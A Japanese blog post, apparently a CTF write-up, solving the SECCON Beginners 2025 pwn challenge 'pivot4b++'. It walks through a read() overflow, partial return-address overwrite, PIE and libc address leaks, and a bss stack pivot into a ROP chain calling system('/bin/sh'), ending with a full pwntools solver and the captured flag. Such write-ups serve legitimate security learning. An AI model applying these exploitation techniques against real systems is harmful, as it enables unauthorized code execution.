---
layout: default
title: "SECCON Beginners CTF 2025 - pwn / pivot4b++"
date: 2025-07-28 00:00:00 +0900
categories: writeups
tags: [CTF, pwn, stack pivot, buffer overflow]
---
# ざっくり解説
***
stack pivotを使ってflagを獲得するプログラム🤖 

[1回目]<br>
`read()`のオーバーフローを利用して、リターンアドレスの書き換え+実行ファイルのベースアドレスをリークする。<br>
[2回目]<br>
`read()`のオーバーフローを利用して、リターンアドレスの書き換えを行う。ループ中にlibcのベースアドレスをリークする。<br>
[3回目]<br>
`read()`のオーバーフローを利用して、stack pivotを行い、rspをbss領域に移動させてsystem("/bin/sh")でflagを獲得🔥<br>
<br>

# 問題について
***

**[説明文]**<br>
pivot4bからGiftがなくなってしまいました...<br>
※前の問題で使えたGift関数がなくなったよという説明です！<br>

**[配布ファイル]**  
・`chall`:実行ファイル<br>
・`src.c`:ソースファイル<br>
・`libc.so.6`:標準ライブラリファイル<br>
・`Dockerfile`:実行環境作成<br>
・`docker-compose.yml`:実行環境作成<br>

**[処理の流れ]**  
1.メッセージの入力<br>
→<br>
2.入力したメッセージが出力される。<br>
<br>
すごいシンプル！<br>

実際に実行すると、終端文字`\0`がないためもともとstackにあるものまで見えちゃうみたいです！
```bash
$　echo -e "abc" |./chall
Welcome to the second pivot game!
> Message: abc
�w

$　echo -e "abc\0" |./chall
Welcome to the second pivot game!
> Message: abc
```
**[🎯目的]**  
リモートで動いてる`chall`にリクエストを投げて、
`/app/flag-xxxxxxxxx.txt`を獲得する🔥
<br><br><br>

# 今回の脆弱性
***

**1.read関数の読み込みサイズ誤り**  
`read(0, message, sizeof(message) + 0x10);`で、<br>
指定した変数のサイズをこえて(16バイト)書き込むためにバッファオーバーフローになってしまう。<br>

```bash
0x7fffffffdae0: 0x00007ffff7f9d760      0x00007ffff7e42079
0x7fffffffdaf0: 0x00007fffffffdc38      0x00007fffffffdb20
0x7fffffffdb00: 0x0000000000000000      0x00007fffffffdc48
0x7fffffffdb10: 0x00007fffffffdb20      0x000055555555522b　← リターンアドレス
```
<br>

# いざ対決 ⚔️⚔️
# ※ASLRが無効状態のアドレスになっています
# (資料作成時にアドレスが変わるため)
***
<br>

# **1回目のループ**
<br>

PIEが有効だ。。。😖<br>
PIEが有効ってことは、プログラムの領域もASLRでランダム化の対象になるってことだ。。。

```bash
$ checksec chall
[*] '/home/elmo/docker-machine/SECCON_Beginners_CTF_2025/pivot4b-2/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

動的ライブラリの使用を確認(libcファイル配られてるし自明)<br>

```bash
$ ldd chall
    linux-vdso.so.1 (0x00007ffc1b3e8000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007b6879d25000)
    /lib64/ld-linux-x86-64.so.2 (0x00007b6879f24000)
```

実際、問題に立ち向かったものの、、、<br>
うーん、こうやってリターンアドレスまでつなげたら、リターンアドレスはリークできるけども<br>
プログラムは終了しちゃうし、リークしたアドレスは再接続したら変わっちゃうし。。。

```bash
0x7fffffffdae0: 0x6161616161616161      0x6161616161616161
0x7fffffffdaf0: 0x6161616161616161      0x6161616161616161
0x7fffffffdb00: 0x6161616161616161      0x6161616161616161
0x7fffffffdb10: 0x6161616161616161      0x000055555555522b　← リターンアドレス
```
<br>
#  やらないといけないことを考えました🐘
<br>

```
リターンアドレスを書き換えたい
↓
プログラムのアドレスを入手したい
↓
そのアドレスをリークさせたい
↓
入力をループさせる必要がある
↓
リターンアドレスを書き換えたい
↓
....
```
<br>
#  思考が無限ループする！😱
<br>
色々悩んだ結果、2つのことがわかりました！！<br><br>

#  (1)ASLRについて<br>
<br>
メモリはページ単位で確保され、通常ページサイズは4Kバイト(4096バイト = 0x1000)。<br>
ASLR(Address Space Layout Randomization)はページサイズの倍数単位でメモリの位置をシフトする。<br>
なので動いても0x1000の単位でしかシフトしないので、下位12ビット(000)は固定とのこと！<br>
<br>
Low-Level Implementation of ASLR　5. Randomization Granularityを参照<br>
[Demystifying ASLR: Understanding, Exploiting, and Defending Against Memory Randomization](https://securitymaven.medium.com/demystifying-aslr-understanding-exploiting-and-defending-against-memory-randomization-4dd8fe648345)

# (2) read()について<br>
<br>
色々ためしてみるときに、最後に`\x0a`が入っちゃって不便だなぁと。。。。<br>
手入力のときとかは最後にenter押したり、pwntoolsで`sendline(b'aaa')`などすると<br>
後ろに改行`\x0a`が入っちゃうんですよね。`sendline(payload)`派だったので、これにはまってしまいました。

```bash
sendline(b'aaa')したとき

0x7fffffffdae0: 0x000000000a616161
```

一方で、send('aaa')すると改行が入りません。

```bash
send('aaa')したとき

0x7fffffffdae0: 0x0000000000616161
```

改行を入れなければ指定されたバイト数まで入力を待つものだと思ってたのですが<br>
`read()`は低レベルのシステムコールなのでバッファリングされない関数のようです。<br>
ただ、今回のようにソースコードに以下がある場合は、いずれにせよバッファリングされないようです。

```c
setvbuf(stdin, NULL, _IONBF, 0);
```

以下の結果をもとに、gdbでmain関数をみていきます。<br><br>
リターンアドレス`(0x55555555522b)`の下位1バイトを`2b`→`26`に書き換えればループできそうだ。<br>
もしくは12ビット(1.5バイト)は固定なので、2バイト書き換えて1/16の確率で狙ったところに飛ぶこともできそう！<br>

```bash
gdb-peda$ disas main
...
0x0000555555555221 <+69>:    call   0x555555555050 <alarm@plt>
0x0000555555555226 <+74>:    call   0x555555555179 <vuln>
0x000055555555522b <+79>:    mov    eax,0x0

gdb-peda$ x/8gx $rsi
0x7fffffffdae0: 0x00007ffff7f9d760      0x00007ffff7e42079
0x7fffffffdaf0: 0x00007fffffffdc38      0x00007fffffffdb20
0x7fffffffdb00: 0x0000000000000000      0x00007fffffffdc48
0x7fffffffdb10: 0x00007fffffffdb20      0x000055555555522b ← リターンアドレス
```

1回目はこんなペイロードになりました。<br><br>
リターンアドレスまでの終端`\0`がないので、アドレスがリークできています。<br>
また、Welcome～が出力されてるので無事ループできましたね！やったー🎉<br>

```python
payload = b'a' * 56
payload += b'\x26'
session.sendafter(b'> ', payload)  
[出力結果]
b'Message: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&RUUUU\nWelcome to the second pivot game!\n> '
```

1回目のpayload送信後のスタックの状態は以下になりました。

```bash
gdb-peda$ x/8gx $rsi
0x7fffffffdae0: 0x6161616161616161      0x6161616161616161
0x7fffffffdaf0: 0x6161616161616161      0x6161616161616161
0x7fffffffdb00: 0x6161616161616161      0x6161616161616161
0x7fffffffdb10: 0x6161616161616161      0x0000555555555226 ← 26になっている
```

<br>
気を付けないといけないことは、リターンアドレスに`\0`が含まれる場合`(例:0x609e7d00a22b)`は無理なケースだと思われます。<br>
<br>
ASLRに祈りましょう👼
<br><br>

# **2回目のループ**
<br>
aaaaa～\nWelcomeの間がリークしたアドレスになるので、バイト列を64ビットのアドレスとして解釈させます。。。

```python
prefix = b'Message: ' + b'a' * 56
leak_bytes = res.split(prefix)[1].split(b'\nWelcome')[0]
leak_addr = int.from_bytes(leak_bytes.ljust(8, b'\x00'), 'little')

hex(leak_addr): 0x555555555226
```

リークしたアドレスをもとにプログラムのベースアドレスを出します。

```bash
0x555555555226 <main+74>:       0x0000b8ffffff4ee8

$ readelf -a ./chall | grep main
000000003fd8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
    25: 00000000000011dc    86 FUNC    GLOBAL DEFAULT   13 main
```
```python
program_base = 0x555555555226 - 74 - 0x11dc

hex(program_base): 0x555555554000
```

<br>
# また、やることを考えました🐘🐘
<br>

```
libcのアドレスをリークしたい
↓
printf関数でFOBしてリークしたい
↓
プログラム中のprintf関数では無理
↓
printf関数のlibcのアドレスを知りたい
↓
libcのアドレスをリークしたい
・・・
```

<br>
# またまた、思考が無限ループする！😱<br>
<br>

道中にある`puts()`でリークしてもいいのですが、引数の`rdi`に設定できるスタックのアドレスがわからないし、<br>
わかったとしても、バッファオーバーフローで書き換えられる長さがリターンアドレスまでしか届かないので、<br>
`pop rdi; ret`→  libcの関数が入ってるアドレス → ループ用アドレス　みたいに最低24バイトないと長さがたりない。。。<br>

色々悩んで、2回目のループ中のvuln関数の最後のretにブレークポイントを設定してレジスタの状態を確認してみました。<br>

```bash
=> 0x5555555551db <vuln+98>:    ret

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x7fffffffdc38 --> 0x7fffffffdf53 --> 0x6c6c6168632f2e ('./chall')
RCX: 0x0 
RDX: 0x0 
RSI: 0x7fffffffb9c0 ("Message: ", 'b' <repeats 48 times>, "`\210UUUU\na&RUUUU\n")
RDI: 0x7fffffffb8a0 --> 0x7ffff7e1bfd0 (<__funlockfile>:        mov    rdi,QWORD PTR [rdi+0x88])
RBP: 0x555555558860 --> 0x0 
RSP: 0x7fffffffdb18 --> 0x55555555518b (<vuln+18>:      call   0x555555555030 <puts@plt>)
RIP: 0x5555555551db (<vuln+98>: ret)
R8 : 0x0 
R9 : 0x73 ('s')
R10: 0x0 
R11: 0x202 
R12: 0x0 
R13: 0x7fffffffdc48 --> 0x7fffffffdf5b ("SHELL=/bin/bash")
R14: 0x555555557da0 --> 0x555555555120 (endbr64)
R15: 0x7ffff7ffd020 --> 0x7ffff7ffe2e0 --> 0x555555554000 --> 0x10102464c457f
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
```
<br>
# rdiにlibcの関数_IO_funlockfileのアドレスが入ってる！！
<br>
```bash
RDI: 0x7fffffffb8a0 --> 0x7ffff7e1bfd0 (<__funlockfile>:        mov    rdi,QWORD PTR [rdi+0x88])
```

`puts()`は、`rdi`に入っている値を文字列のポインタとして受け取り、その先頭から終端の`'\0'`までの文字列を標準出力に表示します。<br>
つまり、今のレジスタの状態のまま`puts()`を呼び出すことで、libcの関数である_IO_funlockfileのアドレスをリークできそうです。<br>
さらに、vuln関数の途中では puts() が呼ばれており、ちょうどそこに戻れば、ループしつつlibcのアドレスリークが可能になります。<br>


```bash
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
...
0x000055555555518b <+18>:    call   0x555555555030 <puts@plt>
```

こんな感じのイメージ！<br>
```text
puts((char *)0x7fffffffb8a0);
⇒　\xd0\xbf\xe1\xf7\xff\x7f
```

2回目のペイロードを作る前に、今回ROPを作るにも長さが8バイトしかないのでどこかにROPchainを書くところを探します。<br>
問題名からもstack pivotを使うことが予想されるので、作戦を立てました。<br>

スタックのアドレスがわからないので、スタックには書けないのでbss領域に書くことにしました。<br>
`read()`で書くことになるのですが、流れをおさらいします。

```text
read(int fd, void *buf, size_t count);
⇒ read(ファイルディスクリプタ,書き込み先アドレス,バイト数);
⇒ read(0,bss領域のアドレス,バイト数);　
※0が標準入力

レジスタはこのように使われます。
read(rdi, rsi, rdx);
```

vuln関数内で`read()`が呼ばれる流れは以下のようになってます。

```bash
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
...
   0x00005555555551a4 <+43>:    lea    rax,[rbp-0x30]
   0x00005555555551a8 <+47>:    mov    edx,0x40
   0x00005555555551ad <+52>:    mov    rsi,rax
   0x00005555555551b0 <+55>:    mov    edi,0x0
   0x00005555555551b5 <+60>:    call   0x555555555060 <read@plt>
```
saved rbpを変更することで制御できそうですね。

2回目はこんなペイロードになりました。<br>
saved rbpにはbss領域のアドレスを入れています。最初は低位アドレスにしてたのですが、system関数の実行に失敗して<br>
高位アドレスにしてみたら成功しちゃいました。<br>
<br>
本来`puts()`で"welcome～"されますが、libcの`_IO_funlockfile`のアドレスの文字`\xd0\xbf\xe1\xf7\xff\x7f\`<br>
として出力されています。puts()が呼ばれているのでループ成功です。🎉<br><br>
`\x88UUUUは、書き換えたsaved rbpのアドレスなので今回は使いません。<br>

```python
payload = b'b' *48
payload += p64(program_base + 0x4860)
payload += p64(program_base + binary.symbols['vuln'] + 18)

[出力結果]
b'Message: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb`\x88UUUU\n\xd0\xbf\xe1\xf7\xff\x7f\n> '
```
2回目のpayload送信後のメモリの状態は以下のようになりました。

```bash
gdb-peda$ x/8gx $rsi
0x7fffffffdae0: 0x6262626262626262      0x6262626262626262
0x7fffffffdaf0: 0x6262626262626262      0x6262626262626262
0x7fffffffdb00: 0x6262626262626262      0x6262626262626262
0x7fffffffdb10: 0x0000555555558860      0x000055555555518b
```
<br>
# **3回目のループ**
<br>

前回のループ同様に取得したバイト列を64ビットのアドレスとして解釈するのですが、アドレスに改行を含む場合は取得が少し大変そう。。<br>
```
b'Message: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb`\x88UUUU\n\xd0\xbf\xe1\xf7\xff\x7f\n> '
```
改行で分割して、要素数がいつもと違う場合はゴニョゴニョしました。捨てパターンでもいいと思うし、あんまり参考ならないと思います；；<br>
また、アドレスに`\0`を含む場合はリーク不可だと思われるので完璧なものはないかもしれないです。<br>

```python
parts = res.split(b'\n')
#アドレスに改行`\x0a`が含まれる場合の緩和策
if len(parts) > 3:
    if len(parts[-2]) < 6:
        parts[-2] = parts[-3] + b'\n' + parts[-2]
libc_IO_funlockfile_byte = parts[-2]          
libc_IO_funlockfile_addr = int.from_bytes(libc_IO_funlockfile_byte, 'little')
libc_base_addr = libc_IO_funlockfile_addr - libc.symbols['_IO_funlockfile']
hex(libc_base_addr): 0x7ffff7dca000
```
3回目のループは、`read()`にROPchainを書いてあげることでbss領域に書き込まれるので、<br>
前の問題のpivot4bと同様にROPchainを作ります。<br><br>
one_gadgetという便利なのものがあること知らなかったので、通常のchainになっています(´・ω・｀)<br>
ROPに必要な関数等のアドレスを調べました。

```python
binsh_addr       = libc_base_addr + next(libc.search(b"/bin/sh"))
system_addr      = libc_base_addr + libc.symbols['system']
leave_ret_addr   = libc_base_addr + rop.find_gadget(['leave', 'ret']).address
ret_addr         = libc_base_addr + rop.find_gadget(['ret']).address
pop_rdi_ret_addr = libc_base_addr + rop.find_gadget(['pop rdi', 'ret']).address
```

3回目のペイロードはこんなかんじになりました。

```python
#rop
payload = b'c' * 8
payload += p64(ret_addr)
payload += p64(pop_rdi_ret_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

#pivot
payload += p64(0)                                #余り8バイト
payload += p64(program_base + 0x4830)
payload += p64(leave_ret_addr)
```

3回目のpayload送信後のメモリの状態は以下のようになりました。書き込み先はbss領域になっています。

```bash
gdb-peda$ x/8gx $rsi
0x555555558830: 0x6363636363636363      0x00007ffff7df0e99
0x555555558840: 0x00007ffff7df17e5      0x00007ffff7f60031
0x555555558850: 0x00007ffff7e16490      0x0000000000000000
0x555555558860: 0x0000555555558830      0x00007ffff7e17f29
```
# **solver.py**

以下が最終的なsolverになりました！

```python
#!/usr/bin/python3
from pwn import *

#program & connect infomation
file = "./chall"
binary = ELF(file, checksec=False)
context.binary= file
#context.log_level = 'debug'
server= 'pivot4b-2.challenges.beginners.seccon.jp'
port = 12300

#case:remote
session = remote(server,port)
libc_file = "./libc.so.6"                                                     #配布されたlibcファイルのパス

#case:local
##session = process(["setarch", "linux64", "-R", file])                         #ASLR無効化用
#session = process(file)
#libc_file = "/lib/x86_64-linux-gnu/libc.so.6"                                #ローカル環境用のlibcファイル

#libc
libc = ELF(libc_file, checksec=False)

#1st send
payload = b'a' * 56
payload += b'\x26'                                                           # 下位1バイトだけ書き換えてメイン関数の戻り値を関数呼び出し前のアドレスにする。
session.sendafter(b'> ', payload)                                            # read()の読み込みサイズ未満で終わる必要がある。改行(\x0a)を含ませないようにsendlineafter()ではなくsendline()で送信

#1st recive
res = session.recvuntil(b'\n> ')                                             # リークするアドレスの途中に終端文字(\x00)がある場合はリーク不可のため異常終了を甘んじて受け入れる。(ex:0x00005600ec01422b)
print("------------------------------------")
print(res)

#base_calc
prefix = b'Message: ' + b'a' * 56
leak_bytes = res.split(prefix)[1].split(b'\nWelcome')[0]
leak_addr = int.from_bytes(leak_bytes.ljust(8, b'\x00'), 'little')
main_addr = leak_addr - 74                                               # main = (main+74) -74  
program_base = main_addr - binary.symbols['main']

print("------------------------------------")
print(f"{'leakaddress:':18} 0x{leak_addr:016x}")
print(f"{'program_base:':18} 0x{program_base:016x}")
print(f"{'main_addr:':18} 0x{main_addr:016x}")

#2nd send
payload = b'b' *48
payload += p64(program_base + 0x4860)                                       # ループ後のread()の第2引数(rdi) にbss領域のアドレスをいれるため
payload += p64(program_base + binary.symbols['vuln'] + 18)                  # puts@plt = vuln + 18    ※ rdiにlibc関数(IO_funlockfile)がはいってたため、そのままleak
session.send(payload)

#2nd recive
res = session.recvuntil(b'\n> ')
print("------------------------------------")
print(res)
parts = res.split(b'\n')                                                    # 改行で分割

#リークアドレスに\nが含まれているかもしれない場合の緩和策。
if len(parts) > 3:
    if len(parts[-2]) < 6:
        parts[-2] = parts[-3] + b'\n' + parts[-2]

libc_IO_funlockfile_byte = parts[-2]                                          # リークしたアドレスに改行を含む場合があるので、最後の直前の改行～最後の改行までの間のバイナリ文字列(putsでリークしたアドレス)を取得          
libc_IO_funlockfile_addr = int.from_bytes(libc_IO_funlockfile_byte, 'little') # puts関数は終端文字(\x00)以降を出力できないため、リークするアドレスに\0が含まれる場合はリーク不可のため異常終了を甘んじて受け入れる。
#calculation
print("------------------------------------")
rop = ROP(libc)
libc_base_addr   = libc_IO_funlockfile_addr - libc.symbols['_IO_funlockfile']
binsh_addr       = libc_base_addr + next(libc.search(b"/bin/sh"))
system_addr      = libc_base_addr + libc.symbols['system']
leave_ret_addr   = libc_base_addr + rop.find_gadget(['leave', 'ret']).address
ret_addr         = libc_base_addr + rop.find_gadget(['ret']).address
pop_rdi_ret_addr = libc_base_addr + rop.find_gadget(['pop rdi', 'ret']).address

print("------------------------------------")
print(f"{'libc_base_addr:':18} 0x{libc_base_addr:016x}")
print(f"{'system_addr:':18} 0x{system_addr:016x}")
print(f"{'binsh_addr:':18} 0x{binsh_addr:016x}")
print(f"{'leave_ret_addr:':18} 0x{leave_ret_addr:016x}")
print(f"{'ret_addr:':18} 0x{ret_addr:016x}")
print(f"{'pop_rdi_ret_addr:':18} 0x{pop_rdi_ret_addr:016x}")

#rop
payload = b'c' * 8
payload += p64(ret_addr)                         #アライメント調整
payload += p64(pop_rdi_ret_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

#pivot
payload += p64(0)                                #なんでもいいよ
payload += p64(program_base + 0x4830)
payload += p64(leave_ret_addr)

#3rd send
session.send(payload)
session.interactive()
```

```bash
$ ls
flag-30f9af30bae6316908ad674471772e05.txt
run
$ cat flag-30f9af30bae6316908ad674471772e05.txt
ctf4b{f3wer_g1fts_gr3ater_j0y}
$ 
```

# 感想
***
書きたいことが多くて、逆に読みづらい文章になってしまいました。<br>
問題制作者さんや他の参加者さんのwriteupを見るとスマートでほんと素敵！！<br>

自分にとってかなり難しい問題でした～😢<br>
かなり時間が掛かりましたが、終了30分前くらいに解けたときは思わず叫んでしまいました！！<br>
pwnはなかなか人気がないようなのですが、楽しいし難しい知識がなくてもそこそこ解けるのでもっと挑戦者が増えてほしいな！<br>
